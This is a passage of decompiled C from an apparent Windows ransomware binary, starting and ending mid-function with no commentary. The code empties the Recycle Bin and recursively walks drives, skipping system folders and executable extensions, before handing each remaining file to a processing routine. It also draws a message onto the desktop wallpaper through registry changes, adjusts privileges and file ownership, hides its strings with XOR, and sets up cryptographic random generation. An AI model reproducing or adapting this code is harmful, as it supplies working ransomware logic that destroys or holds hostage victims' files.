      v4 = Parameter;
      if ( Parameter && *Parameter )
      {
        do
        {
          ++v4;
          ++v3;
        }
        while ( *v4 );
      }
      memcpy((void *)lpString1[dword_41D2FC], Parameter, 2 * v3 + 2);
      ++dword_41D2FC;
      LeaveCriticalSection(&CriticalSection);
      SHEmptyRecycleBinW(0, Parameter, 7u);
      if ( GetDiskFreeSpaceExW(Parameter, &FreeBytesAvailableToCaller, (PULARGE_INTEGER)&v9[3], &TotalNumberOfFreeBytes) )
      {
        StrFormatByteSize64A(*(LONGLONG *)&v9[3], pszBuf, 0x64u);
        StrFormatByteSize64A(TotalNumberOfFreeBytes.QuadPart, v12, 0x64u);
        v5 = 0;
        *(_OWORD *)v7 = xmmword_419030;
        v8 = 1363477328;
        strcpy(v9, "FF");
        do
          v7[++v5] ^= v7[0];
        while ( v5 < 0x15 );
        v9[2] = 0;
        wsprintfA(v14, &v7[1], Parameter, pszBuf, v12);
        sub_4100C0(v14);
      }
      sub_4092E0(Parameter);
      _InterlockedDecrement(&dword_41B110);
      ExitThread(0);
    }
  }
  else
  {
    while ( lstrcmpiW(lpString1[v1], Parameter) )
    {
      if ( ++v1 >= dword_41D2FC )
        goto LABEL_4;
    }
  }
  _InterlockedDecrement(&dword_41B110);
  LeaveCriticalSection(&CriticalSection);
  ExitThread(0);
}
// 419030: using guessed type __int128 xmmword_419030;
// 41B110: using guessed type int dword_41B110;
// 41B120: using guessed type LPCWSTR lpString1[512];
// 41D2FC: using guessed type int dword_41D2FC;
// 4090E0: using guessed type char FindFileData[592];

//----- (004092E0) --------------------------------------------------------
HANDLE __thiscall sub_4092E0(__int16 *this)
{
  HANDLE result; // eax
  void *v2; // edi
  BOOL (__stdcall *v3)(HANDLE, LPWIN32_FIND_DATAW); // esi
  WCHAR *cFileName; // eax
  int v5; // ecx
  const WCHAR *ExtensionW; // esi
  unsigned int v7; // ecx
  __int16 *v8; // ecx
  char *v9; // edx
  __int16 v10; // ax
  WCHAR *v11; // edx
  unsigned int v13; // edx
  __int16 *v14; // edi
  __int16 v15; // ax
  char dwFileAttributes; // al
  WCHAR FileName[263]; // [esp+10h] [ebp-788h] BYREF
  __int16 v18; // [esp+21Eh] [ebp-57Ah] BYREF
  WCHAR pszPath[264]; // [esp+220h] [ebp-578h] BYREF
  WCHAR v20[100]; // [esp+430h] [ebp-368h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+4F8h] [ebp-2A0h] BYREF
  __int128 v22; // [esp+74Eh] [ebp-4Ah] BYREF
  _BYTE v23[18]; // [esp+75Eh] [ebp-3Ah] BYREF
  wchar_t v24[6]; // [esp+770h] [ebp-28h] BYREF
  WCHAR v25[4]; // [esp+77Ch] [ebp-1Ch] BYREF
  WCHAR v26[4]; // [esp+784h] [ebp-14h] BYREF
  __int16 *v27; // [esp+78Ch] [ebp-Ch]
  WCHAR String1[2]; // [esp+790h] [ebp-8h] BYREF
  HANDLE v29; // [esp+794h] [ebp-4h]

  wcscpy(v24, L"%s\\*");
  v27 = this;
  wsprintfW(FileName, v24, this);
  result = FindFirstFileExW(FileName, FindExInfoStandard, &FindFileData, FindExSearchNameMatch, 0, 0);
  v2 = result;
  v29 = result;
  if ( result != (HANDLE)-1 )
  {
    v3 = FindNextFileW;
    wcscpy(String1, L".");
    wcscpy(v26, L"..");
    wcscpy((wchar_t *)&v23[6], L"%s\\%s");
    do
    {
      if ( lstrcmpiW(String1, FindFileData.cFileName) && lstrcmpiW(v26, FindFileData.cFileName) )
      {
        cFileName = FindFileData.cFileName;
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          if ( lstrcmpiW(FindFileData.cFileName, L"$windows.~bt")
            && lstrcmpiW(FindFileData.cFileName, L"intel")
            && lstrcmpiW(FindFileData.cFileName, L"msocache")
            && lstrcmpiW(FindFileData.cFileName, L"$recycle.bin")
            && lstrcmpiW(FindFileData.cFileName, L"$windows.~ws")
            && lstrcmpiW(FindFileData.cFileName, L"tor browser")
            && lstrcmpiW(FindFileData.cFileName, L"boot")
            && lstrcmpiW(FindFileData.cFileName, L"system volume information")
            && lstrcmpiW(FindFileData.cFileName, L"perflogs")
            && lstrcmpiW(FindFileData.cFileName, L"google")
            && lstrcmpiW(FindFileData.cFileName, L"application data")
            && lstrcmpiW(FindFileData.cFileName, L"windows")
            && lstrcmpiW(FindFileData.cFileName, L"windows.old")
            && lstrcmpiW(FindFileData.cFileName, L"appdata")
            && lstrcmpiW(FindFileData.cFileName, L"Windows nt")
            && lstrcmpiW(FindFileData.cFileName, L"Msbuild")
            && lstrcmpiW(FindFileData.cFileName, L"Microsoft")
            && lstrcmpiW(FindFileData.cFileName, L"All users")
            && lstrcmpiW(FindFileData.cFileName, L"mozilla") )
          {
            wsprintfW(FileName, (LPCWSTR)&v23[6], v27, FindFileData.cFileName);
            sub_4092E0(FileName);
          }
        }
        else
        {
          v5 = 0;
          if ( FindFileData.cFileName[0] )
          {
            do
            {
              ++cFileName;
              ++v5;
            }
            while ( *cFileName );
          }
          if ( v5 > 4 )
          {
            ExtensionW = PathFindExtensionW(FindFileData.cFileName);
            if ( lstrcmpiW(L".386", ExtensionW) )
            {
              if ( lstrcmpiW(L".cmd", ExtensionW) )
              {
                if ( lstrcmpiW(L".exe", ExtensionW) )
                {
                  if ( lstrcmpiW(L".ani", ExtensionW) )
                  {
                    if ( lstrcmpiW(L".adv", ExtensionW) )
                    {
                      if ( lstrcmpiW(L".theme", ExtensionW) )
                      {
                        if ( lstrcmpiW(L".msi", ExtensionW) )
                        {
                          if ( lstrcmpiW(L".msp", ExtensionW) )
                          {
                            if ( lstrcmpiW(L".com", ExtensionW) )
                            {
                              if ( lstrcmpiW(L".diagpkg", ExtensionW) )
                              {
                                if ( lstrcmpiW(L".nls", ExtensionW) )
                                {
                                  if ( lstrcmpiW(L".diagcab", ExtensionW) )
                                  {
                                    if ( lstrcmpiW(L".lock", ExtensionW) )
                                    {
                                      if ( lstrcmpiW(L".ocx", ExtensionW) )
                                      {
                                        if ( lstrcmpiW(L".mpa", ExtensionW) )
                                        {
                                          if ( lstrcmpiW(L".cpl", ExtensionW) )
                                          {
                                            if ( lstrcmpiW(L".mod", ExtensionW) )
                                            {
                                              if ( lstrcmpiW(L".hta", ExtensionW) )
                                              {
                                                if ( lstrcmpiW(L".icns", ExtensionW) )
                                                {
                                                  if ( lstrcmpiW(L".prf", ExtensionW) )
                                                  {
                                                    if ( lstrcmpiW(L".rtp", ExtensionW) )
                                                    {
                                                      if ( lstrcmpiW(L".diagcfg", ExtensionW) )
                                                      {
                                                        if ( lstrcmpiW(L".msstyles", ExtensionW) )
                                                        {
                                                          if ( lstrcmpiW(L".bin", ExtensionW) )
                                                          {
                                                            if ( lstrcmpiW(L".hlp", ExtensionW) )
                                                            {
                                                              if ( lstrcmpiW(L".shs", ExtensionW) )
                                                              {
                                                                if ( lstrcmpiW(L".drv", ExtensionW) )
                                                                {
                                                                  if ( lstrcmpiW(L".wpx", ExtensionW) )
                                                                  {
                                                                    if ( lstrcmpiW(L".bat", ExtensionW) )
                                                                    {
                                                                      if ( lstrcmpiW(L".rom", ExtensionW) )
                                                                      {
                                                                        if ( lstrcmpiW(L".msc", ExtensionW) )
                                                                        {
                                                                          if ( lstrcmpiW(L".spl", ExtensionW) )
                                                                          {
                                                                            if ( lstrcmpiW(L".ps1", ExtensionW) )
                                                                            {
                                                                              if ( lstrcmpiW(L".msu", ExtensionW) )
                                                                              {
                                                                                if ( lstrcmpiW(L".ics", ExtensionW) )
                                                                                {
                                                                                  if ( lstrcmpiW(L".key", ExtensionW) )
                                                                                  {
                                                                                    if ( lstrcmpiW(L".mp3", ExtensionW) )
                                                                                    {
                                                                                      if ( lstrcmpiW(
                                                                                             L".reg",
                                                                                             ExtensionW) )
                                                                                      {
                                                                                        if ( lstrcmpiW(
                                                                                               L".dll",
                                                                                               ExtensionW) )
                                                                                        {
                                                                                          if ( lstrcmpiW(
                                                                                                 L".ini",
                                                                                                 ExtensionW) )
                                                                                          {
                                                                                            if ( lstrcmpiW(
                                                                                                   L".idx",
                                                                                                   ExtensionW) )
                                                                                            {
                                                                                              if ( lstrcmpiW(
                                                                                                     L".sys",
                                                                                                     ExtensionW) )
                                                                                              {
                                                                                                if ( lstrcmpiW(L".hlp", ExtensionW) )
                                                                                                {
                                                                                                  if ( lstrcmpiW(L".ico", ExtensionW) )
                                                                                                  {
                                                                                                    if ( lstrcmpiW(L".lnk", ExtensionW) )
                                                                                                    {
                                                                                                      if ( lstrcmpiW(L".rdp", ExtensionW) )
                                                                                                      {
                                                                                                        v7 = 0;
                                                                                                        v22 = xmmword_419830;
                                                                                                        strcpy(v23, "~#yuy");
                                                                                                        do
                                                                                                          v23[v7++ - 15] ^= v22;
                                                                                                        while ( v7 < 0x14 );
                                                                                                        v23[5] = 0;
                                                                                                        wcscpy(v25, L"%S");
                                                                                                        wsprintfW(v20, v25, (char *)&v22 + 1);
                                                                                                        if ( lstrcmpiW(v20, FindFileData.cFileName) )
                                                                                                        {
                                                                                                          if ( lstrcmpiW(L"ntldr", FindFileData.cFileName) && lstrcmpiW(L"ntuser.dat.log", FindFileData.cFileName) && lstrcmpiW(L"bootsect.bak", FindFileData.cFileName) && lstrcmpiW(L"autorun.inf", FindFileData.cFileName) )
                                                                                                          {
                                                                                                            v8 = v27;
                                                                                                            v9 = (char *)((char *)pszPath - (char *)v27);
                                                                                                            do
                                                                                                            {
                                                                                                              v10 = *v8++;
                                                                                                              *(_WORD *)&v9[(_DWORD)v8 - 2] = v10;
                                                                                                            }
                                                                                                            while ( v10 );
                                                                                                            PathAddBackslashW(pszPath);
                                                                                                            v11 = FindFileData.cFileName;
                                                                                                            while ( *v11++ )
                                                                                                              ;
                                                                                                            v13 = (char *)v11 - (char *)FindFileData.cFileName;
                                                                                                            v14 = &v18;
                                                                                                            do
                                                                                                            {
                                                                                                              v15 = v14[1];
                                                                                                              ++v14;
                                                                                                            }
                                                                                                            while ( v15 );
                                                                                                            dwFileAttributes = FindFileData.dwFileAttributes;
                                                                                                            qmemcpy(v14, FindFileData.cFileName, v13);
                                                                                                            if ( (dwFileAttributes & 4) == 0 && ((dwFileAttributes & 1) == 0 || SetFileAttributesW(pszPath, 0x80u)) )
                                                                                                              sub_412A40(pszPath);
                                                                                                            v2 = v29;
                                                                                                          }
                                                                                                        }
                                                                                                      }
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            v3 = FindNextFileW;
          }
        }
      }
    }
    while ( v3(v2, &FindFileData) );
    result = (HANDLE)GetLastError();
    if ( result == (HANDLE)18 )
      return (HANDLE)FindClose(v2);
  }
  return result;
}
// 419830: using guessed type __int128 xmmword_419830;

//----- (00409A20) --------------------------------------------------------
int sub_409A20()
{
  unsigned int v0; // eax
  int v1; // edx
  _BYTE *i; // eax
  __int128 v4[8]; // [esp+2h] [ebp-82h] BYREF
  __int16 v5; // [esp+82h] [ebp-2h]

  v0 = 0;
  v4[0] = xmmword_419630;
  v5 = 1;
  v4[1] = xmmword_4190A0;
  v4[2] = xmmword_4192A0;
  v4[3] = xmmword_418FB0;
  v4[4] = xmmword_419270;
  v4[5] = xmmword_419640;
  v4[6] = xmmword_419070;
  v4[7] = xmmword_419200;
  do
    *((_BYTE *)v4 + ++v0) ^= LOBYTE(v4[0]);
  while ( v0 < 0x80 );
  v1 = 0;
  HIBYTE(v5) = 0;
  for ( i = (char *)v4 + 1; *i; ++v1 )
    ++i;
  return sub_409AE0((int)v4 + 1, v1);
}
// 418FB0: using guessed type __int128 xmmword_418FB0;
// 419070: using guessed type __int128 xmmword_419070;
// 4190A0: using guessed type __int128 xmmword_4190A0;
// 419200: using guessed type __int128 xmmword_419200;
// 419270: using guessed type __int128 xmmword_419270;
// 4192A0: using guessed type __int128 xmmword_4192A0;
// 419630: using guessed type __int128 xmmword_419630;
// 419640: using guessed type __int128 xmmword_419640;

//----- (00409AE0) --------------------------------------------------------
int __fastcall sub_409AE0(int a1, int a2)
{
  int FontFamilyFromName; // eax
  int v3; // edx
  int v4; // esi
  int *v5; // ecx
  int GenericFontFamilySansSerif; // eax
  int *v7; // ecx
  int v8; // eax
  int v9; // edx
  const unsigned __int16 **v10; // esi
  signed int v11; // edi
  WCHAR *v12; // edi
  const unsigned __int16 **v13; // eax
  const unsigned __int16 **v14; // edi
  unsigned int v15; // esi
  const unsigned __int16 **v16; // edi
  int v17; // eax
  unsigned int v18; // ecx
  char v19; // cl
  unsigned int v20; // eax
  unsigned int v21; // ecx
  BYTE *v22; // eax
  int v23; // ecx
  bool v24; // zf
  LSTATUS v25; // eax
  int v26; // edi
  int cbMultiByte; // [esp+18h] [ebp-4F8h] BYREF
  BYTE Data[2]; // [esp+1Ch] [ebp-4F4h] BYREF
  char v30[4]; // [esp+20h] [ebp-4F0h] BYREF
  _DWORD v31[4]; // [esp+24h] [ebp-4ECh] BYREF
  size_t Size; // [esp+34h] [ebp-4DCh] BYREF
  const unsigned __int16 **SystemMetrics; // [esp+38h] [ebp-4D8h]
  int v34; // [esp+3Ch] [ebp-4D4h] BYREF
  int v35; // [esp+40h] [ebp-4D0h]
  HKEY phkResult; // [esp+44h] [ebp-4CCh] BYREF
  int v37; // [esp+48h] [ebp-4C8h]
  CHAR ValueName[16]; // [esp+4Ch] [ebp-4C4h] BYREF
  int v39; // [esp+5Ch] [ebp-4B4h]
  int v40; // [esp+60h] [ebp-4B0h] BYREF
  int v41; // [esp+64h] [ebp-4ACh] BYREF
  int v42; // [esp+68h] [ebp-4A8h] BYREF
  int v43; // [esp+6Ch] [ebp-4A4h] BYREF
  int v44; // [esp+70h] [ebp-4A0h]
  int v45; // [esp+74h] [ebp-49Ch]
  int v46; // [esp+78h] [ebp-498h]
  int v47[2]; // [esp+7Ch] [ebp-494h] BYREF
  int v48[3]; // [esp+84h] [ebp-48Ch] BYREF
  int v49[4]; // [esp+90h] [ebp-480h] BYREF
  CHAR SubKey[16]; // [esp+A1h] [ebp-46Fh] BYREF
  char v51[11]; // [esp+B1h] [ebp-45Fh] BYREF
  int v52[4]; // [esp+BCh] [ebp-454h] BYREF
  int v53[4]; // [esp+CCh] [ebp-444h] BYREF
  char v54[4]; // [esp+DCh] [ebp-434h] BYREF
  __int128 v55; // [esp+E0h] [ebp-430h] BYREF
  WCHAR TempFileName[264]; // [esp+F0h] [ebp-420h] BYREF
  WCHAR Buffer[264]; // [esp+300h] [ebp-210h] BYREF

  cbMultiByte = a2;
  *(_DWORD *)&v51[7] = a1;
  v52[0] = 1;
  memset(&v52[1], 0, 12);
  GdiplusStartup(v54, v52, 0);
  SystemMetrics = (const unsigned __int16 **)GetSystemMetrics(16);
  Size = GetSystemMetrics(17);
  v40 = 0;
  GdipCreateBitmapFromScan0(SystemMetrics, Size, 0, 2498570, 0, &v40);
  v46 = v40;
  v41 = 0;
  GdipGetImageGraphicsContext(v40, &v41);
  v37 = v41;
  v42 = 0;
  GdipCreateSolidFill(-65536, &v42);
  v45 = v42;
  v43 = 0;
  GdipCreateSolidFill(-16777216, &v43);
  v44 = v43;
  v48[0] = 7471169;
  v48[1] = 6357097;
  v48[2] = 108;
  v34 = 0;
  v31[0] = 0;
  FontFamilyFromName = GdipCreateFontFamilyFromName(v48, 0, v31);
  v3 = v31[0];
  v4 = v31[0];
  v31[1] = 0;
  v35 = FontFamilyFromName;
  if ( !FontFamilyFromName )
    goto LABEL_6;
  v5 = (int *)dword_41D310;
  if ( !dword_41D310 )
  {
    dword_41D310 = (int)&unk_41D308;
    GenericFontFamilySansSerif = GdipGetGenericFontFamilySansSerif(&unk_41D308);
    v5 = (int *)dword_41D310;
    *(_DWORD *)(dword_41D310 + 4) = GenericFontFamilySansSerif;
    v3 = v31[0];
  }
  v4 = *v5;
  v35 = v5[1];
  if ( v35 )
  {
    GdipDeleteFontFamily(v3);
  }
  else
  {
LABEL_6:
    v35 = GdipCreateFont(v4, 1101004800, 3, 3, &v34);
    if ( v35 )
    {
      v7 = (int *)dword_41D310;
      if ( !dword_41D310 )
      {
        dword_41D310 = (int)&unk_41D308;
        v8 = GdipGetGenericFontFamilySansSerif(&unk_41D308);
        v7 = (int *)dword_41D310;
        *(_DWORD *)(dword_41D310 + 4) = v8;
      }
      v9 = *v7;
      v35 = v7[1];
      if ( !v35 )
        v35 = GdipCreateFont(v9, 1101004800, 3, 3, &v34);
    }
    GdipDeleteFontFamily(v31[0]);
  }
  v10 = SystemMetrics;
  v11 = Size;
  v53[0] = 1112014848;
  v53[1] = 1112014848;
  v47[0] = 0;
  *(float *)&v53[2] = (float)(int)(SystemMetrics - 25);
  *(float *)&v53[3] = (float)(int)(Size - 50);
  v47[1] = GdipCreateStringFormat(0, 0, v47);
  ((void (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GdipFillRectangle)(
    v37,
    v44,
    0,
    0,
    (float)(int)v10,
    (float)v11);
  v12 = (WCHAR *)malloc(2 * cbMultiByte);
  if ( MultiByteToWideChar(0, 0, *(LPCCH *)&v51[7], cbMultiByte, v12, cbMultiByte) < 0 )
    goto LABEL_40;
  GdipDrawString(v37, v12, cbMultiByte, v34, v53, v47[0], v45);
  free(v12);
  *(_DWORD *)ValueName = 7143529;
  *(_DWORD *)&ValueName[4] = 6750305;
  *(_DWORD *)&ValueName[8] = 3080293;
  *(_DWORD *)&ValueName[12] = 7143522;
  v39 = 112;
  cbMultiByte = 0;
  Size = 0;
  GdipGetImageEncodersSize(&cbMultiByte, &Size);
  if ( Size )
  {
    v13 = (const unsigned __int16 **)malloc(Size);
    v14 = v13;
    SystemMetrics = v13;
    if ( v13 )
    {
      GdipGetImageEncoders(cbMultiByte, Size, v13);
      v15 = 0;
      if ( cbMultiByte )
      {
        v16 = v14 + 12;
        while ( 1 )
        {
          v17 = wcscmp(*v16, (const unsigned __int16 *)ValueName);
          if ( v17 )
            v17 = v17 < 0 ? -1 : 1;
          if ( !v17 )
            break;
          ++v15;
          v16 += 19;
          if ( v15 >= cbMultiByte )
          {
            v14 = SystemMetrics;
            goto LABEL_22;
          }
        }
        v55 = *(_OWORD *)&SystemMetrics[19 * v15];
        free(SystemMetrics);
      }
      else
      {
LABEL_22:
        free(v14);
      }
    }
  }
  GetTempPathW(0x104u, Buffer);
  GetTempFileNameW(Buffer, 0, 0, TempFileName);
  wcscpy((wchar_t *)v49, L"%s.bmp");
  wsprintfW(TempFileName, (LPCWSTR)v49, TempFileName);
  if ( GdipSaveImageToFile(v46, TempFileName, &v55, 0) < 0 )
    goto LABEL_40;
  v18 = 0;
  *(_OWORD *)ValueName = xmmword_418FE0;
  do
    ValueName[++v18] ^= ValueName[0];
  while ( v18 < 0xE );
  ValueName[15] = 0;
  v19 = 35;
  strcpy((char *)v31, "#wJOFtBOOSBSFQ");
  v20 = 0;
  while ( 1 )
  {
    *((_BYTE *)v31 + ++v20) ^= v19;
    if ( v20 >= 0xD )
      break;
    v19 = v31[0];
  }
  v21 = 0;
  BYTE2(v31[3]) = 0;
  *(_OWORD *)SubKey = xmmword_419320;
  strcpy(v51, "?)1.5*");
  do
    SubKey[++v21] ^= SubKey[0];
  while ( v21 < 0x15 );
  v51[6] = 0;
  if ( RegOpenKeyA(HKEY_CURRENT_USER, &SubKey[1], &phkResult) )
    goto LABEL_40;
  strcpy((char *)Data, "2");
  v22 = Data;
  v23 = 0;
  do
  {
    v24 = *++v22 == 0;
    ++v23;
  }
  while ( !v24 );
  v25 = RegSetValueExA(phkResult, &ValueName[1], 0, 1u, Data, v23 + 1);
  if ( v25 )
    goto LABEL_40;
  strcpy(v30, "0");
  do
    ++v25;
  while ( v30[v25] );
  if ( RegSetValueExA(phkResult, (LPCSTR)v31 + 1, 0, 1u, (const BYTE *)v30, v25 + 1) )
  {
LABEL_40:
    v26 = 0;
  }
  else
  {
    RegCloseKey(phkResult);
    SystemParametersInfoW(0x14u, 0, TempFileName, 3u);
    v26 = 1;
  }
  GdipDeleteStringFormat(v47[0]);
  GdipDeleteFont(v34);
  GdipDeleteBrush(v44);
  GdipDeleteBrush(v45);
  GdipDeleteGraphics(v37);
  GdipDisposeImage(v46);
  return v26;
}
// 4152D8: using guessed type int __stdcall GdipDrawString(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4152DC: using guessed type int __stdcall GdipCreateStringFormat(_DWORD, _DWORD, _DWORD);
// 4152E0: using guessed type int __stdcall GdipDeleteFontFamily(_DWORD);
// 4152E4: using guessed type int __stdcall GdipGetImageEncoders(_DWORD, _DWORD, _DWORD);
// 4152E8: using guessed type int __stdcall GdipCreateFontFamilyFromName(_DWORD, _DWORD, _DWORD);
// 4152EC: using guessed type int __stdcall GdipDeleteBrush(_DWORD);
// 4152F0: using guessed type int __stdcall GdipDisposeImage(_DWORD);
// 4152F4: using guessed type int __stdcall GdipCreateFont(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4152F8: using guessed type int __stdcall GdipCreateSolidFill(_DWORD, _DWORD);
// 4152FC: using guessed type int __stdcall GdipFillRectangle(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 415300: using guessed type int __stdcall GdipGetGenericFontFamilySansSerif(_DWORD);
// 415304: using guessed type int __stdcall GdiplusStartup(_DWORD, _DWORD, _DWORD);
// 415308: using guessed type int __stdcall GdipGetImageGraphicsContext(_DWORD, _DWORD);
// 41530C: using guessed type int __stdcall GdipGetImageEncodersSize(_DWORD, _DWORD);
// 415310: using guessed type int __stdcall GdipDeleteGraphics(_DWORD);
// 415314: using guessed type int __stdcall GdipDeleteStringFormat(_DWORD);
// 415318: using guessed type int __stdcall GdipDeleteFont(_DWORD);
// 41531C: using guessed type int __stdcall GdipCreateBitmapFromScan0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 415320: using guessed type int __stdcall GdipSaveImageToFile(_DWORD, _DWORD, _DWORD, _DWORD);
// 418FE0: using guessed type __int128 xmmword_418FE0;
// 419320: using guessed type __int128 xmmword_419320;
// 41D310: using guessed type int dword_41D310;
// 409AE0: using guessed type char var_434[4];

//----- (0040A1F0) --------------------------------------------------------
int __fastcall sub_40A1F0(_BYTE *a1)
{
  int result; // eax

  for ( result = 0; *a1; ++result )
    ++a1;
  return result;
}

//----- (0040A200) --------------------------------------------------------
int __fastcall sub_40A200(_WORD *a1)
{
  int result; // eax

  result = 0;
  if ( a1 && *a1 )
  {
    do
    {
      ++a1;
      ++result;
    }
    while ( *a1 );
  }
  return result;
}

//----- (0040A220) --------------------------------------------------------
BOOL sub_40A220()
{
  BOOL result; // eax
  unsigned int v1; // ecx
  unsigned int v2; // ecx
  _BYTE v3[21]; // [esp+7h] [ebp-31h] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [esp+1Ch] [ebp-1Ch] BYREF
  struct _LUID Luid; // [esp+2Ch] [ebp-Ch] BYREF
  void *TokenHandle; // [esp+34h] [ebp-4h] BYREF

  result = OpenProcessToken((HANDLE)0xFFFFFFFF, 0x28u, &TokenHandle);
  if ( result )
  {
    v1 = 0;
    *(_OWORD *)&v3[3] = xmmword_419280;
    *(_WORD *)&v3[19] = 25;
    do
      v3[v1++ + 4] ^= v3[3];
    while ( v1 < 0x10 );
    v3[20] = 0;
    LookupPrivilegeValueA(0, &v3[4], &Luid);
    NewState.Privileges[0].Luid = Luid;
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Attributes = 2;
    if ( AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, 0, 0) )
    {
      v2 = 0;
      *(_OWORD *)v3 = xmmword_4194B0;
      *(_DWORD *)&v3[16] = 1785594139;
      v3[20] = 0;
      do
        v3[++v2] ^= v3[0];
      while ( v2 < 0x13 );
      v3[20] = 0;
      sub_4100C0(&v3[1]);
    }
    return CloseHandle(TokenHandle);
  }
  return result;
}
// 419280: using guessed type __int128 xmmword_419280;
// 4194B0: using guessed type __int128 xmmword_4194B0;

//----- (0040A2F0) --------------------------------------------------------
unsigned int __thiscall sub_40A2F0(_DWORD *this)
{
  unsigned int v2; // esi
  signed int v3; // eax
  signed int LastError; // eax
  char pSid[68]; // [esp+8h] [ebp-54h] BYREF
  HANDLE TokenInformation; // [esp+4Ch] [ebp-10h] BYREF
  void *TokenHandle; // [esp+50h] [ebp-Ch] BYREF
  DWORD cbSid; // [esp+54h] [ebp-8h] BYREF
  WINBOOL IsMember; // [esp+58h] [ebp-4h] BYREF

  TokenHandle = 0;
  TokenInformation = 0;
  v2 = 0;
  IsMember = 0;
  cbSid = 0;
  *this = 0;
  if ( OpenProcessToken((HANDLE)0xFFFFFFFF, 8u, &TokenHandle) )
  {
    cbSid = 68;
    if ( CreateWellKnownSid(WinBuiltinAdministratorsSid, 0, pSid, &cbSid) )
    {
      if ( CheckTokenMembership(0, pSid, &IsMember) )
      {
        if ( IsMember )
        {
LABEL_15:
          *this = 1;
          goto LABEL_16;
        }
        if ( !GetTokenInformation(TokenHandle, TokenLinkedToken, &TokenInformation, 4u, &cbSid) )
        {
          LastError = GetLastError();
          if ( LastError != 1312 && LastError != 1314 )
          {
            if ( LastError > 0 )
              v2 = (unsigned __int16)LastError | 0x80070000;
            else
              v2 = LastError;
          }
          goto LABEL_16;
        }
        if ( CheckTokenMembership(TokenInformation, pSid, &IsMember) )
        {
          if ( !IsMember )
            goto LABEL_16;
          goto LABEL_15;
        }
      }
    }
  }
  v3 = GetLastError();
  v2 = v3;
  if ( v3 > 0 )
    v2 = (unsigned __int16)v3 | 0x80070000;
LABEL_16:
  if ( TokenHandle )
    CloseHandle(TokenHandle);
  if ( TokenInformation )
    CloseHandle(TokenInformation);
  return v2;
}

//----- (0040A410) --------------------------------------------------------
BOOL __thiscall sub_40A410(LPCWSTR lpFileName)
{
  BOOL v2; // edi
  PSID *v3; // esi
  char pSecurityDescriptor[20]; // [esp+Ch] [ebp-20h] BYREF
  LPCWSTR lpFileNamea; // [esp+20h] [ebp-Ch]
  DWORD ReturnLength; // [esp+24h] [ebp-8h] BYREF
  void *TokenHandle; // [esp+28h] [ebp-4h] BYREF

  TokenHandle = 0;
  v2 = 0;
  lpFileNamea = lpFileName;
  ReturnLength = 0;
  OpenProcessToken((HANDLE)0xFFFFFFFF, 8u, &TokenHandle);
  v3 = (PSID *)malloc(0x200u);
  if ( v3 )
  {
    if ( GetTokenInformation(TokenHandle, TokenUser, v3, 0x200u, &ReturnLength) )
    {
      if ( InitializeSecurityDescriptor(pSecurityDescriptor, 1u) )
      {
        if ( SetSecurityDescriptorOwner(pSecurityDescriptor, *v3, 0) )
        {
          CloseHandle(TokenHandle);
          if ( SetFileSecurityW(lpFileName, 1u, pSecurityDescriptor) )
            v2 = SetFileSecurityW(lpFileNamea, 4u, pSecurityDescriptor);
        }
      }
    }
  }
  free(v3);
  return v2;
}

//----- (0040A4D0) --------------------------------------------------------
int sub_40A4D0()
{
  unsigned int v0; // ecx
  unsigned int v1; // ecx
  __int128 v3[2]; // [esp+2h] [ebp-5Eh]
  int v4; // [esp+22h] [ebp-3Eh]
  int v5; // [esp+26h] [ebp-3Ah]
  int v6; // [esp+2Ah] [ebp-36h]
  char v7[3]; // [esp+2Eh] [ebp-32h] BYREF
  _OWORD v8[2]; // [esp+31h] [ebp-2Fh] BYREF
  int v9; // [esp+51h] [ebp-Fh]
  int v10; // [esp+55h] [ebp-Bh]
  int v11; // [esp+59h] [ebp-7h]
  __int16 v12; // [esp+5Dh] [ebp-3h]
  char v13; // [esp+5Fh] [ebp-1h]

  v0 = 0;
  v3[0] = xmmword_419260;
  v4 = 1678775567;
  v3[1] = xmmword_419250;
  v5 = 387649891;
  v6 = 353507092;
  strcpy(v7, "f_");
  do
    *((_BYTE *)v3 + ++v0) ^= LOBYTE(v3[0]);
  while ( v0 < 0x2D );
  v1 = 0;
  v8[0] = xmmword_4193B0;
  v7[2] = 0;
  v8[1] = xmmword_4193C0;
  v9 = 1583177285;
  v10 = 1347967275;
  v11 = 1549282649;
  v12 = 5419;
  v13 = 0;
  do
    *((_BYTE *)v8 + ++v1) ^= LOBYTE(v8[0]);
  while ( v1 < 0x2D );
  v13 = 0;
  if ( OpenMutexA(0, 0, (LPCSTR)v8 + 1) )
    return 1;
  CreateMutexA(0, 0, (LPCSTR)v8 + 1);
  return 0;
}
// 419250: using guessed type __int128 xmmword_419250;
// 419260: using guessed type __int128 xmmword_419260;
// 4193B0: using guessed type __int128 xmmword_4193B0;
// 4193C0: using guessed type __int128 xmmword_4193C0;

//----- (0040A5A0) --------------------------------------------------------
BOOL __stdcall sub_40A5A0(BYTE *pbBuffer, DWORD dwLen)
{
  DWORD v2; // eax
  BOOL result; // eax
  HMODULE LibraryA; // eax
  FARPROC ProcAddress; // eax
  WCHAR szProvider[44]; // [esp+Ch] [ebp-78h] BYREF
  CHAR ProcName[16]; // [esp+64h] [ebp-20h] BYREF
  CHAR LibFileName[12]; // [esp+74h] [ebp-10h] BYREF
  HCRYPTPROV phProv; // [esp+80h] [ebp-4h] BYREF

  v2 = 0;
  wcscpy(szProvider, L"Microsoft Base Cryptographic Provider v1.0");
  if ( dword_41D334 == 1 )
  {
    if ( dwLen )
    {
      do
      {
        do
        {
          __asm { rdrand  esi }
